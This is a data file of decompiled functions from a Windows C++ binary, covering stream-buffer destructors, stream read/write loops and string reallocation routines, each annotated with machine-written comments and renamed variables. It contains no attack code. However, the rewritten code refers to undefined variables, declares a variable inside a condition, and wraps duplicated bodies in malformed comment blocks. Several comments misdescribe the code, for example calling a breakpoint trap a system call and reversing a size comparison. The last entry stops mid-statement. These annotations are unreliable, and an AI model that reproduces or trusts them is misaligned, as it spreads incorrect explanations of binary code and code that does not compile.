{"Function Name": "FUN_140007320", "Address": "140007320", "Source Code": "\n// Function to perform a specific operation based on input parameters\nint FUN_140007320(longlong memory_address, int condition)\n{\n    // Retrieve a value from a specific memory address\n    ulonglong uVar1 = **(ulonglong **)(memory_address + 0x38);\n    \n    // Check conditions for further processing\n    if (uVar1 != 0 && (**(ulonglong **)(memory_address + 0x18) < uVar1) &&\n        (condition == -1 || ((char)condition == *(char *)(uVar1 - 1) || ((*(byte *)(memory_address + 0x70) & 2) == 0)))\n    ) {\n        // Increment a value stored at a specific memory address\n        **(int **)(memory_address + 0x50) += 1;\n        // Decrement a value stored at a specific memory address\n        **(longlong **)(memory_address + 0x38) -= 1;\n        \n        // Update memory based on input parameter\n        if (condition != -1) {\n            *(char *)**(undefined8 **)(memory_address + 0x38) = (char)condition;\n        } else {\n            condition = 0;\n        }\n        \n        // Return the updated parameter value\n        return condition;\n    }\n    \n    // Return -1 if conditions are not met\n    return -1;\n}\n"}
{"Function Name": "FUN_140007380", "Address": "140007380", "Source Code": "\n// Function definition for FUN_140007380\nulonglong FUN_140007380(longlong memory_address, uint specific_value)\n{\n    // Check if a specific bit in memory is set\n    if ((*(byte *)(memory_address + 0x70) & 2) != 0) {\n        return 0xffffffffffffffff; // Return max unsigned long long value\n    }\n    \n    // Check if param_2 is equal to a specific value\n    if (specific_value == 0xffffffff) {\n        return 0; // Return 0\n    }\n    \n    // Retrieve values from memory addresses\n    ulonglong value_1 = **(ulonglong **)(memory_address + 0x40);\n    int value_2 = **(int **)(memory_address + 0x58);\n    ulonglong result = value_1 + (longlong)value_2;\n    \n    // Perform calculations and update memory values\n    if ((value_1 != 0) && (value_1 < result)) {\n        **(int **)(memory_address + 0x58) = value_2 + -1;\n        *(char *)(**(longlong **)(memory_address + 0x40) + 1) = (char)specific_value;\n        *(ulonglong *)(memory_address + 0x68) = value_1 + 1;\n        return (ulonglong)specific_value;\n    }\n    \n    // More calculations and memory updates based on conditions\n    undefined8 *memory_values = *(undefined8 **)(memory_address + 0x18);\n    // ...\n    \n    // Return a value based on conditions\n    return (ulonglong)specific_value;\n}\n"}
{"Function Name": "FUN_140007580", "Address": "140007580", "Source Code": "\\*\n// Set the vftable of the basic_stringbuf class to the parameter\n*new_param = std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::vftable;\n\n// Check if the 14th element of the parameter is odd\nif ((*(byte *)(new_param + 0xe) & 1) != 0) {\n    // Calculate lVar5 based on conditions\n    longlong lVar5 = (*(longlong *)new_param[8] == 0) ? (longlong)*(int *)new_param[10] + *(longlong *)new_param[7] : (longlong)*(int *)new_param[0xb] + *(longlong *)new_param[8];\n    longlong lVar1 = *(longlong *)new_param[3];\n    \n    // Check conditions for calling functions\n    if ((0xfff < (ulonglong)(lVar5 - lVar1)) && (0x1f < (lVar1 - *(longlong *)(lVar1 + -8)) - 8U)) {\n        FUN_14000ed18();\n        (*(code *)swi(3))();\n        return;\n    }\n    thunk_FUN_14000b460();\n}\n\n// Reset values in the parameter\n*(undefined8 *)new_param[3] = 0;\n*(undefined8 *)new_param[7] = 0;\n*(undefined4 *)new_param[10] = 0;\n*(undefined8 *)new_param[4] = 0;\n*(undefined8 *)new_param[8] = 0;\n*(undefined4 *)new_param[0xb] = 0;\n*(uint *)(new_param + 0xe) &= 0xfffffffe;\n*new_param = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;\nnew_param[0xd] = 0;\n\n// Check if the 12th element of the parameter is 0\nif (new_param[0xc] == 0) {\n    return;\n}\n\n// Call functions based on conditions\nlonglong *plVar2 = *(longlong **)(new_param[0xc] + 8);\nif ((plVar2 != (longlong *)0x0) && ((*(undefined8 *)(**(code **)(*plVar2 + 0x10))() != (undefined8 *)0x0))) {\n    (**(code **)*puVar4)(puVar4,1);\n}\nthunk_FUN_14000b460();\n*\\ \n \nvoid FUN_140007580(undefined8 *new_param)\n{\n    *new_param = std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::vftable;\n    if ((*(byte *)(new_param + 0xe) & 1) != 0) {\n        longlong lVar5 = (*(longlong *)new_param[8] == 0) ? (longlong)*(int *)new_param[10] + *(longlong *)new_param[7] : (longlong)*(int *)new_param[0xb] + *(longlong *)new_param[8];\n        longlong lVar1 = *(longlong *)new_param[3];\n        if ((0xfff < (ulonglong)(lVar5 - lVar1)) && (0x1f < (lVar1 - *(longlong *)(lVar1 + -8)) - 8U)) {\n            FUN_14000ed18();\n            (*(code *)swi(3))();\n            return;\n        }\n        thunk_FUN_14000b460();\n    }\n    *(undefined8 *)new_param[3] = 0;\n    *(undefined8 *)new_param[7] = 0;\n    *(undefined4 *)new_param[10] = 0;\n    *(undefined8 *)new_param[4] = 0;\n    *(undefined8 *)new_param[8] = 0;\n    *(undefined4 *)new_param[0xb] = 0;\n    *(uint *)(new_param + 0xe) &= 0xfffffffe;\n    *new_param = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;\n    new_param[0xd] = 0;\n    if (new_param[0xc] == 0) {\n        return;\n    }\n    longlong *plVar2 = *(longlong **)(new_param[0xc] + 8);\n    if ((plVar2 != (longlong *)0x0) && ((*(undefined8 *)(**(code **)(*plVar2 + 0x10))() != (undefined8 *)0x0))) {\n        (**(code **)*puVar4)(puVar4,1);\n    }\n    thunk_FUN_14000b460();\n}"}
{"Function Name": "std::basic_iostream<char,struct_std::char_traits<char>_>::~basic_iostream<char,struct_std::char_traits<char>_>", "Address": "140007680", "Source Code": "\\*\nvoid __thiscall\nstd::basic_iostream<char,struct_std::char_traits<char>_>::\n~basic_iostream<char,struct_std::char_traits<char>_>\n(basic_iostream<char,struct_std::char_traits<char>_> *this)\n{\n    // Set the virtual function table pointer for the current instance\n    *(undefined ***)(this + (longlong)*(int *)(*(longlong *)(this + -0x20) + 4) + -0x20) = vftable;\n\n    // Set the virtual function table pointer for the basic_ostream part of the instance\n    *(undefined ***)(this + (longlong)*(int *)(*(longlong *)(this + -0x10) + 4) + -0x10) =\n        basic_ostream<char,struct_std::char_traits<char>_>::vftable;\n\n    // Set the virtual function table pointer for the basic_istream part of the instance\n    *(undefined ***)(this + (longlong)*(int *)(*(longlong *)(this + -0x20) + 4) + -0x20) =\n        basic_istream<char,struct_std::char_traits<char>_>::vftable;\n\n    // Return from the destructor\n    return;\n}\n*\\ \n \n\nvoid __thiscall\nstd::basic_iostream<char,struct_std::char_traits<char>_>::\n~basic_iostream<char,struct_std::char_traits<char>_>\n(basic_iostream<char,struct_std::char_traits<char>_> *this)\n{\n    *(undefined ***)(this + (longlong)*(int *)(*(longlong *)(this + -0x20) + 4) + -0x20) = vftable;\n    *(undefined ***)(this + (longlong)*(int *)(*(longlong *)(this + -0x10) + 4) + -0x10) =\n        basic_ostream<char,struct_std::char_traits<char>_>::vftable;\n    *(undefined ***)(this + (longlong)*(int *)(*(longlong *)(this + -0x20) + 4) + -0x20) =\n        basic_istream<char,struct_std::char_traits<char>_>::vftable;\n    return;\n}\n"}
{"Function Name": "~basic_istream<>", "Address": "140007700", "Source Code": "\\*\nvoid ~basic_istream<>(longlong istream_param) // Destructor for basic_istream\n{\n    int retrieved_value = *(int *)(*(longlong *)(istream_param + -0x18) + 4); // Retrieve an integer value from a specific memory location\n    *(undefined ***)((longlong)retrieved_value + -0x18 + istream_param) = std::basic_istream<char,struct_std::char_traits<char>_>::vftable; // Set the virtual function table pointer\n    *(int *)((longlong)retrieved_value + -0x1c + istream_param) = retrieved_value - 0x18; // Update an integer value at another memory location\n    return; // Exit the function\n}\n*\\ \n \n\nvoid ~basic_istream<>(longlong istream_param)\n{\n    int retrieved_value = *(int *)(*(longlong *)(istream_param + -0x18) + 4);\n    *(undefined ***)((longlong)retrieved_value + -0x18 + istream_param) = std::basic_istream<char,struct_std::char_traits<char>_>::vftable;\n    *(int *)((longlong)retrieved_value + -0x1c + istream_param) = retrieved_value - 0x18;\n    return;\n}\n"}
{"Function Name": "FUN_140007750", "Address": "140007750", "Source Code": "\n// Function declaration: FUN_140007750 takes an undefined8 type parameter and returns an undefined8 type\nundefined8 FUN_140007750(undefined8 input_parameter)\n{\n    // Return the input parameter without modification\n    return input_parameter;\n}\n"}
{"Function Name": "FUN_140007760", "Address": "140007760", "Source Code": "\nundefined8 * FUN_140007760(undefined8 input_value, undefined8 *output_array)\n{\n    *output_array = -1;          // Set the first element of param_2 to -1\n    output_array[1] = 0;        // Set the second element of param_2 to 0\n    output_array[2] = 0;        // Set the third element of param_2 to 0\n    return output_array;       // Return the pointer to param_2\n}\n"}
{"Function Name": "FUN_140007780", "Address": "140007780", "Source Code": "\nlonglong FUN_140007780(longlong *inputArray, undefined1 *dataPointer, longlong initialValue)\n{\n    longlong resultValue; // Variable to hold a longlong value\n    int functionResult; // Variable to hold an integer return value\n    ulonglong functionOutput; // Variable to hold an unsigned longlong value\n    ulonglong remainingValue = initialValue; // Initialize uVar4 with the value of param_3\n    ulonglong minValue; // Variable to hold an unsigned longlong value\n\n    if (0 < initialValue) { // Check if param_3 is greater than 0\n        do {\n            functionOutput = FUN_140007fb0((longlong)inputArray); // Call function and store result in uVar3\n            if ((longlong)functionOutput < 1) { // If uVar3 is less than 1\n                functionResult = (**(code **)(*inputArray + 0x18))(inputArray, *dataPointer); // Call a function pointer and store the result\n                if (functionResult == -1) break; // If the result is -1, exit the loop\n                resultValue = -1; // Set lVar1 to -1\n                minValue = 1; // Set uVar5 to 1\n            } else {\n                minValue = (longlong)functionOutput <= (longlong)remainingValue ? functionOutput : remainingValue; // Determine the minimum value between uVar3 and uVar4\n                FUN_14000c330(*(undefined8 **)inputArray[8], (undefined8 *)dataPointer, minValue); // Call another function with parameters\n                resultValue = -minValue; // Set lVar1 to the negative of uVar5\n                *(int *)inputArray[0xb] -= (int)minValue; // Decrement the value at param_1[0xb] by uVar5\n                *(longlong *)inputArray[8] += (longlong)(int)minValue; // Increment the value at param_1[8] by uVar5\n            }\n            remainingValue += resultValue; // Update uVar4 by adding lVar1\n            dataPointer = (undefined1 *)((longlong)dataPointer + minValue); // Increment param_2 by uVar5\n        } while (0 < (longlong)remainingValue); // Continue the loop while uVar4 is greater than 0\n    }\n    return initialValue - remainingValue; // Return the difference between param_3 and uVar4\n}\n"}
{"Function Name": "FUN_1400077a6", "Address": "1400077a6", "Source Code": "\nlonglong FUN_1400077a6(void) // Function definition\n{\n    longlong resultValue; // Variable to store a long long value\n    ulonglong functionResult; // Variable to store an unsigned long long value\n    ulonglong minValue; // Variable to store another unsigned long long value\n    ulonglong unusedCounter; // Unused variable, possibly a register or global state\n    undefined8 *pointerToUndefinedType; // Pointer to an undefined 8-byte type\n    longlong *pointerToLongLong; // Pointer to a long long type\n\n    do {\n        functionResult = FUN_140007fb0((longlong)pointerToLongLong); // Call function and store result in uVar3\n        if ((longlong)functionResult < 1) { // Check if uVar3 is less than 1\n            if ((**(code **)(*pointerToLongLong + 0x18))() == -1) break; // Call a function and check for error\n            resultValue = -1; // Set lVar1 to -1\n            minValue = 1; // Set uVar4 to 1\n        } else {\n            minValue = (longlong)functionResult <= (longlong)unusedCounter ? functionResult : unusedCounter; // Determine the minimum value between uVar3 and unaff_RBX\n            FUN_14000c330(*(undefined8 **)pointerToLongLong[8], pointerToUndefinedType, minValue); // Call another function with parameters\n            resultValue = -minValue; // Set lVar1 to the negative of uVar4\n            *(int *)pointerToLongLong[0xb] -= (int)minValue; // Decrement the value at the specified pointer by uVar4\n            *(longlong *)pointerToLongLong[8] += (longlong)(int)minValue; // Increment the value at the specified pointer by uVar4\n        }\n        unusedCounter += resultValue; // Update unaff_RBX by adding lVar1\n        pointerToUndefinedType = (undefined8 *)((longlong)pointerToUndefinedType + minValue); // Update the pointer unaff_RSI by adding uVar4\n    } while (0 < (longlong)unusedCounter); // Continue loop while unaff_RBX is greater than 0\n    \n    return unaff_RBP - unusedCounter; // Return the difference between unaff_RBP and unaff_RBX\n}\n"}
{"Function Name": "FUN_140007814", "Address": "140007814", "Source Code": "\nlonglong FUN_140007814(void) // Function declaration returning a long long integer\n{\n    return base_pointer - offset_value; // Return the difference between unaff_RBP and unaff_RBX\n}\n"}
{"Function Name": "FUN_140007830", "Address": "140007830", "Source Code": "\nlonglong FUN_140007830(longlong *input_pointer, undefined1 *output_buffer, longlong initial_value)\n{\n    longlong temp_value; // Variable to hold a temporary longlong value\n    int function_result; // Variable to hold an integer return value\n    ulonglong function_output; // Variable to hold the result from FUN_140007fd0\n    ulonglong remaining_value = initial_value; // Copy of the input parameter param_3\n    ulonglong increment_value; // Variable to hold a temporary ulonglong value\n\n    if (0 < initial_value) { // Check if param_3 is greater than 0\n        do {\n            function_output = FUN_140007fd0((longlong)input_pointer); // Call FUN_140007fd0 with param_1 and store the result in uVar3\n            if ((longlong)function_output < 1) { // If uVar3 is less than 1\n                function_result = (**(code **)(*input_pointer + 0x38))(input_pointer); // Call a function pointer from param_1 and store the result in iVar2\n                if (function_result == -1) break; // If the result is -1, exit the loop\n                *output_buffer = (char)function_result; // Store the result as a char in param_2\n                temp_value = -1; // Set lVar1 to -1\n                increment_value = 1; // Set uVar5 to 1\n            } else {\n                increment_value = (longlong)function_output <= (longlong)remaining_value ? function_output : remaining_value; // Determine the minimum value between uVar3 and uVar4\n                FUN_14000c330((undefined8 *)output_buffer, *(undefined8 **)input_pointer[7], increment_value); // Call FUN_14000c330 with param_2, an element from param_1, and uVar5\n                temp_value = -increment_value; // Set lVar1 to the negative of uVar5\n                *(int *)input_pointer[10] -= (int)increment_value; // Decrement the integer at param_1[10] by uVar5\n                *(longlong *)input_pointer[7] += (longlong)(int)increment_value; // Increment the longlong at param_1[7] by uVar5\n            }\n            remaining_value += temp_value; // Update uVar4 by adding lVar1\n            output_buffer = (undefined1 *)((longlong)output_buffer + increment_value); // Move param_2 forward by uVar5\n        } while (0 < (longlong)remaining_value); // Continue the loop while uVar4 is greater than 0\n    }\n    return initial_value - remaining_value; // Return the difference between param_3 and uVar4\n}\n"}
{"Function Name": "FUN_140007856", "Address": "140007856", "Source Code": "\nlonglong FUN_140007856(void)\n{\n    longlong resultValue; // Variable to store a long long value\n    ulonglong functionResult; // Variable to store an unsigned long long value from function call\n    ulonglong minValue; // Variable to store the minimum value between uVar3 and unaff_RBX\n    ulonglong globalValue; // Unused variable, possibly a global or external variable\n    longlong *longLongPointer; // Pointer to a long long, possibly an array or structure\n    undefined8 *bufferPointer; // Pointer to an undefined 8-byte type, possibly a buffer\n\n    do {\n        functionResult = FUN_140007fd0((longlong)longLongPointer); // Call a function and store the result in uVar3\n        if ((longlong)functionResult < 1) { // Check if uVar3 is less than 1\n            if ((**(code **)(*longLongPointer + 0x38))() == -1) break; // Call a function and break if it returns -1\n            *(char *)bufferPointer = (char)1; // Set the first byte of the buffer pointed by unaff_R14 to 1\n            resultValue = -1; // Set lVar1 to -1\n            minValue = 1; // Set uVar4 to 1\n        } else {\n            minValue = (longlong)functionResult <= (longlong)globalValue ? functionResult : globalValue; // Determine the minimum value between uVar3 and unaff_RBX\n            FUN_14000c330(bufferPointer, *(undefined8 **)longLongPointer[7], minValue); // Call a function with parameters\n            resultValue = -minValue; // Set lVar1 to the negative of uVar4\n            *(int *)longLongPointer[10] -= (int)minValue; // Decrement the value at the 10th index of unaff_RSI by uVar4\n            *(longlong *)longLongPointer[7] += (longlong)(int)minValue; // Increment the value at the 7th index of unaff_RSI by uVar4\n        }\n        globalValue += resultValue; // Update unaff_RBX by adding lVar1\n        bufferPointer = (undefined8 *)((longlong)bufferPointer + minValue); // Move the pointer unaff_R14 forward by uVar4\n    } while (0 < (longlong)globalValue); // Continue the loop while unaff_RBX is greater than 0\n    \n    return unaff_RBP - globalValue; // Return the difference between unaff_RBP and unaff_RBX\n}\n"}
{"Function Name": "FUN_1400078c4", "Address": "1400078c4", "Source Code": "\nlonglong FUN_1400078c4(void)\n{\n    // Calculate the difference between the values in registers unaff_RBP and unaff_RBX\n    return registerValue1 - registerValue2;\n}\n"}
{"Function Name": "FUN_1400078e0", "Address": "1400078e0", "Source Code": "\nulonglong FUN_1400078e0(longlong *input_array)\n{\n    ulonglong return_value; // Declare a variable to store the return value of the function call\n\n    return_value = (**(code **)(*input_array + 0x30))(); // Call a function pointer located at offset 0x30 of the first element of param_1\n\n    if ((int)return_value == -1) { // Check if the return value indicates an error\n        return return_value; // Return the error code\n    }\n\n    *(int *)input_array[10] = *(int *)input_array[10] - 1; // Decrement the integer value at index 10 of param_1\n    *(byte **)input_array[7] += 1; // Increment the byte pointer at index 7 of param_1\n    return (ulonglong)*((byte **)input_array[7] - 1); // Return the value pointed to by the byte pointer at index 7, cast to ulonglong\n}\n"}
{"Function Name": "FUN_140007930", "Address": "140007930", "Source Code": "\nvoid FUN_140007930(ios_base *iosBaseParam) // Function definition with parameter param_1 of type ios_base\n{\n    *(undefined ***)iosBaseParam = std::ios_base::vftable; // Set the virtual function table for the ios_base object\n    std::ios_base::_Ios_base_dtor(iosBaseParam); // Call the destructor for the ios_base object\n}\n"}
{"Function Name": "FUN_140007960", "Address": "140007960", "Source Code": "\nlonglong * FUN_140007960(longlong address, uint flag)\n{\n    // Call a function to perform an operation on the address (param_1 - 0x98)\n    FUN_140006700((longlong *)(address - 0x98));\n    \n    // Check if the least significant bit of param_2 is set\n    if (flag & 1) {\n        // Call another function if the condition is met\n        thunk_FUN_14000b460();\n    }\n    \n    // Return the address (param_1 - 0x98) as a longlong pointer\n    return (longlong *)(address - 0x98);\n}\n"}
{"Function Name": "FUN_1400079a0", "Address": "1400079a0", "Source Code": "\nundefined8 * FUN_1400079a0(undefined8 *input_pointer, uint flag)\n{\n    // Call the function FUN_140007580 with param_1\n    process_input(input_pointer);\n    \n    // Check if the least significant bit of param_2 is set\n    if (flag & 1) {\n        // Call thunk_FUN_14000b460 if the condition is true\n        execute_thunk();\n    }\n    \n    // Return the modified param_1\n    return input_pointer;\n}\n"}
{"Function Name": "FUN_1400079e0", "Address": "1400079e0", "Source Code": "\nios_base * FUN_1400079e0(ios_base *base_pointer,uint flags)\n{\n    // Calculate a pointer to a structure 32 bytes before param_1\n    ios_base *adjusted_pointer = base_pointer - 0x20;\n\n    // Set the virtual function table for basic_iostream<char> at a specific offset\n    *(undefined ***)(base_pointer + (longlong)*(int *)(*(longlong *)adjusted_pointer + 4) - 0x20) =\n        std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;\n\n    // Store an adjusted integer value at a specific offset\n    *(int *)(base_pointer + (longlong)*(int *)(*(longlong *)adjusted_pointer + 4) - 0x24) =\n        *(int *)(*(longlong *)adjusted_pointer + 4) - 0x20;\n\n    // Set the virtual function table for basic_ostream<char> at a specific offset\n    *(undefined ***)(base_pointer + (longlong)*(int *)(*(longlong *)(base_pointer - 0x10) + 4) - 0x10) =\n        std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;\n\n    // Store an adjusted integer value at a specific offset\n    *(int *)(base_pointer + (longlong)*(int *)(*(longlong *)(base_pointer - 0x10) + 4) - 0x14) =\n        *(int *)(*(longlong *)(base_pointer - 0x10) + 4) - 0x10;\n\n    // Set the virtual function table for basic_istream<char> at a specific offset\n    *(undefined ***)(base_pointer + (longlong)*(int *)(*(longlong *)adjusted_pointer + 4) - 0x20) =\n        std::basic_istream<char,struct_std::char_traits<char>_>::vftable;\n\n    // Store an adjusted integer value at a specific offset\n    *(int *)(base_pointer + (longlong)*(int *)(*(longlong *)adjusted_pointer + 4) - 0x24) =\n        *(int *)(*(longlong *)adjusted_pointer + 4) - 0x18;\n\n    // Set the virtual function table for ios_base at the start of param_1\n    *(undefined ***)base_pointer = std::ios_base::vftable;\n\n    // Call the destructor for ios_base\n    std::ios_base::_Ios_base_dtor(base_pointer);\n\n    // If the first bit of param_2 is set, call a thunk function\n    if ((flags & 1) != 0) {\n        thunk_FUN_14000b460();\n    }\n\n    // Return the calculated pointer\n    return adjusted_pointer;\n}\n"}
{"Function Name": "FID_conflict:`scalar_deleting_destructor'", "Address": "140007aa0", "Source Code": "\nios_base * FID_conflict__scalar_deleting_destructor_(ios_base *base_object_pointer, uint flags)\n{\n    // Calculate the pointer to the base object by subtracting 0x10 from param_1\n    ios_base *base_object = base_object_pointer - 0x10;\n\n    // Set the virtual function table pointer for the object at the calculated offset\n    *(undefined ***)(base_object_pointer + (offset)*(int *)(*(longlong *)base_object + 4) - 0x10) =\n        std::basic_ostream<char, struct std::char_traits<char>>::vftable;\n\n    // Update the integer value at the calculated offset to reflect the new state\n    *(int *)(base_object_pointer + (offset)*(int *)(*(longlong *)base_object + 4) - 0x14) =\n        *(int *)(*(longlong *)base_object + 4) - 0x10;\n\n    // Set the virtual function table pointer for the current object\n    *(undefined ***)base_object_pointer = std::ios_base::vftable;\n\n    // Call the destructor for ios_base\n    std::ios_base::_Ios_base_dtor(base_object_pointer);\n\n    // Check if the second parameter has the least significant bit set\n    if (flags & 1) {\n        // Call the thunk function if the condition is met\n        thunk_FUN_14000b460();\n    }\n\n    // Return the pointer to the base object\n    return base_object;\n}\n"}
{"Function Name": "FID_conflict:`scalar_deleting_destructor'", "Address": "140007b10", "Source Code": "\nios_base * FID_conflict__scalar_deleting_destructor_(ios_base *base_object_pointer, uint flag)\n{\n    // Calculate the pointer to the base object by subtracting 0x18 from param_1\n    ios_base *base_object = base_object_pointer - 0x18;\n\n    // Set the virtual table pointer for the basic_istream<char> at the calculated offset\n    *(undefined ***)(base_object_pointer + (offset)*(int *)(*(longlong *)base_object + 4) - 0x18) =\n        std::basic_istream<char, struct_std::char_traits<char>_>::vftable;\n\n    // Update the integer value at the calculated offset to reflect the new state\n    *(int *)(base_object_pointer + (offset)*(int *)(*(longlong *)base_object + 4) - 0x1c) =\n        *(int *)(*(longlong *)base_object + 4) - 0x18;\n\n    // Set the virtual table pointer for ios_base at the start of param_1\n    *(undefined ***)base_object_pointer = std::ios_base::vftable;\n\n    // Call the destructor for ios_base\n    std::ios_base::_Ios_base_dtor(base_object_pointer);\n\n    // If the least significant bit of param_2 is set, call the thunk function\n    if ((flag & 1) != 0) {\n        thunk_FUN_14000b460();\n    }\n\n    // Return the pointer to the base object\n    return base_object;\n}\n"}
{"Function Name": "FUN_140007b80", "Address": "140007b80", "Source Code": "\nundefined8 * FUN_140007b80(undefined8 *stream_buffer, ulonglong flag)\n{\n    longlong *long_pointer; // Pointer to a longlong variable\n    undefined8 *result_pointer; // Pointer to an undefined8 variable\n\n    // Assign the vftable of basic_streambuf to the first element of param_1\n    *stream_buffer = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;\n\n    // Check if the 12th element of param_1 is not null\n    if (stream_buffer[0xc] != 0) {\n        // Get the pointer to the longlong from the 12th element of param_1\n        long_pointer = *(longlong **)(stream_buffer[0xc] + 8);\n\n        // Check if plVar1 is not null\n        if (long_pointer != (longlong *)0x0) {\n            // Call the function pointed to by the longlong pointer and store the result in puVar2\n            result_pointer = (undefined8 *)(**(code **)(*long_pointer + 0x10))();\n\n            // Check if puVar2 is not null\n            if (result_pointer != (undefined8 *)0x0) {\n                // Call the function pointed to by puVar2 with argument 1\n                (**(code **)*result_pointer)(result_pointer, 1);\n            }\n        }\n\n        // Call the thunk function\n        thunk_FUN_14000b460();\n    }\n\n    // Check if the least significant bit of param_2 is set\n    if ((flag & 1) != 0) {\n        // Call the thunk function\n        thunk_FUN_14000b460();\n    }\n\n    // Return the modified param_1\n    return stream_buffer;\n}\n"}
{"Function Name": "FUN_140007c00", "Address": "140007c00", "Source Code": "\nios_base * FUN_140007c00(ios_base *iosBasePtr, uint flags)\n{\n    // Set the virtual function table for the ios_base object\n    *(undefined ***)iosBasePtr = std::ios_base::vftable;\n    \n    // Call the destructor for the ios_base object\n    std::ios_base::_Ios_base_dtor(iosBasePtr);\n    \n    // Check if the first bit of param_2 is set\n    if ((flags & 1) != 0) {\n        // Call the thunk function if the condition is met\n        thunk_FUN_14000b460();\n    }\n    \n    // Return the modified ios_base object\n    return iosBasePtr;\n}\n"}
{"Function Name": "FUN_140007c50", "Address": "140007c50", "Source Code": "\nlonglong * FUN_140007c50(longlong *memory_block, undefined8 *data_source, ulonglong requested_size) {\n    ulonglong current_size = memory_block[3]; // Get the current size from the fourth element of param_1\n    if (current_size < requested_size) { // Check if the current size is less than the requested size\n        if (0x7ffffffffffffffe < requested_size) { // Check if requested size exceeds maximum limit\n            FUN_140008a30(); // Call a function to handle the error\n            code *pcVar2 = (code *)swi(3); // Switch to a system call\n            return (longlong *)(*pcVar2)(); // Return the result of the system call\n        }\n        ulonglong aligned_size = (requested_size | 7); // Align the requested size to 8 bytes\n        ulonglong max_size = 0x7ffffffffffffffe; // Initialize uVar7 to maximum limit\n        if (((aligned_size < 0x7fffffffffffffff) && (current_size <= 0x7ffffffffffffffe - (current_size >> 1))) && // Check conditions for resizing\n            (ulonglong new_size = (current_size >> 1) + current_size, max_size = aligned_size, aligned_size < new_size)) { // Calculate new size\n            max_size = new_size; // Update uVar7 if conditions are met\n        }\n        undefined8 *allocated_memory = (undefined8 *)0x0; // Initialize pointer for new memory\n        aligned_size = (max_size + 1) * 2; // Calculate the size needed for allocation\n        if ((max_size + 1 < 0x8000000000000000) && (aligned_size < 0x1000)) { // Check if allocation size is reasonable\n            if (aligned_size != 0) { // Ensure size is not zero\n                allocated_memory = (undefined8 *)operator_new(aligned_size); // Allocate memory\n            }\n        } else {\n            aligned_size = 0xffffffffffffffff; // Set uVar5 to maximum size\n            if (aligned_size <= aligned_size) { // Redundant check, can be removed\n                aligned_size = 0xffffffffffffffff; // Keep uVar5 at maximum size\n            }\n            void *raw_memory = operator_new(aligned_size); // Attempt to allocate maximum size\n            if (raw_memory == (void *)0x0) goto LAB_140007db4; // Check if allocation failed\n            allocated_memory = (undefined8 *)((longlong)raw_memory + 0x27U & 0xffffffffffffffe0); // Align the pointer\n            allocated_memory[-1] = raw_memory; // Store the original pointer for later deallocation\n        }\n        memory_block[3] = max_size; // Update the size in param_1\n        memory_block[2] = requested_size; // Update the requested size in param_1\n        FUN_14000c330(allocated_memory, data_source, requested_size * 2); // Copy data from param_2 to the newly allocated memory\n        *(undefined2 *)(requested_size * 2 + (longlong)allocated_memory) = 0; // Null-terminate the copied data\n        if (7 < current_size) { // Check if the previous size was greater than 7\n            if ((0xfff < current_size * 2 + 2) && (0x1f < (*memory_block - *(longlong *)(*memory_block + -8)) - 8U)) { // Check conditions for further processing\n                LAB_140007db4: // Label for error handling\n                FUN_14000ed18(); // Call a function to handle the error\n                code *pcVar2 = (code *)swi(3); // Switch to a system call\n                return (longlong *)(*pcVar2)(); // Return the result of the system call\n            }\n            thunk_FUN_14000b460(); // Call a thunk function for additional processing\n        }\n        *memory_block = (longlong)allocated_memory; // Update the first element of param_1 to point to the new memory\n    } else {\n        longlong *target_memory = (7 < current_size) ? (longlong *)*memory_block : memory_block; // Determine the pointer to use based on size\n        memory_block[2] = requested_size; // Update the requested size in param_1\n        FUN_14000c330(target_memory, data_source, requested_size * 2); // Copy data from param_2 to the appropriate memory location\n        *(undefined2 *)(requested_size * 2 + (longlong)target_memory) = 0; // Null-terminate the copied data\n    }\n    return memory_block; // Return the updated param_1\n}\n"}
{"Function Name": "FUN_140007dc0", "Address": "140007dc0", "Source Code": "\nlonglong * FUN_140007dc0(longlong *memory_block, undefined8 *data_pointer, ulonglong requested_size)\n{\n    ulonglong current_size = memory_block[3]; // Get the current size from the third element of param_1\n    longlong *pointer_to_use;\n\n    // Check if the requested size (param_3) is less than or equal to the current size\n    if (requested_size <= current_size) {\n        // Determine the pointer to use based on the current size\n        pointer_to_use = (current_size > 0xf) ? (longlong *)*memory_block : memory_block;\n        memory_block[2] = requested_size; // Update the size in the second element of param_1\n        FUN_14000c330(pointer_to_use, data_pointer, requested_size); // Call a function to handle the data\n        *(undefined1 *)(requested_size + (longlong)pointer_to_use) = 0; // Null-terminate the data\n        return memory_block; // Return the updated param_1\n    }\n\n    // Check if the requested size exceeds the maximum allowable size\n    if (requested_size > 0x7fffffffffffffff) {\n        FUN_140008a30(); // Handle the error case\n        code *context_switch = (code *)swi(3); // Switch to a different context\n        return (longlong *)(*context_switch)(); // Return from the new context\n    }\n\n    ulonglong aligned_size = requested_size | 0xf; // Align the requested size\n    ulonglong max_size = 0x7fffffffffffffff; // Initialize uVar8 to the maximum size\n\n    // Check if the requested size is within a safe range for allocation\n    if ((aligned_size < 0x8000000000000000) && (current_size <= 0x7fffffffffffffff - (current_size >> 1))) {\n        ulonglong new_size = (current_size >> 1) + current_size; // Calculate a new size based on current size\n        if (aligned_size < new_size) {\n            max_size = new_size; // Update uVar8 if the new size is smaller\n        }\n    }\n\n    aligned_size = max_size + 1; // Prepare for allocation by incrementing uVar8\n    if (max_size == 0xffffffffffffffff) {\n        aligned_size = 0xffffffffffffffff; // Handle the edge case for maximum size\n    }\n\n    undefined8 *allocated_memory;\n    // Allocate memory based on the calculated size\n    if (aligned_size < 0x1000) {\n        allocated_memory = (aligned_size == 0) ? (undefined8 *)0x0 : (undefined8 *)operator_new(aligned_size);\n    } else {\n        ulonglong new_size = aligned_size + 0x27; // Adjust size for alignment\n        if (new_size <= aligned_size) {\n            new_size = 0xffffffffffffffff; // Handle overflow case\n        }\n        void *raw_memory = operator_new(new_size); // Allocate memory\n        if (raw_memory == (void *)0x0) goto FUN_140007f0b; // Check for allocation failure\n        allocated_memory = (undefined8 *)((longlong)raw_memory + 0x27U & 0xffffffffffffffe0); // Align the pointer\n        allocated_memory[-1] = raw_memory; // Store the original pointer for later deallocation\n    }\n\n    memory_block[2] = requested_size; // Update the size in param_1\n    memory_block[3] = max_size; // Update the maximum size in param_1\n    FUN_14000c330(allocated_memory, data_pointer, requested_size); // Call a function to handle the data\n    *(undefined1 *)(requested_size + (longlong)allocated_memory) 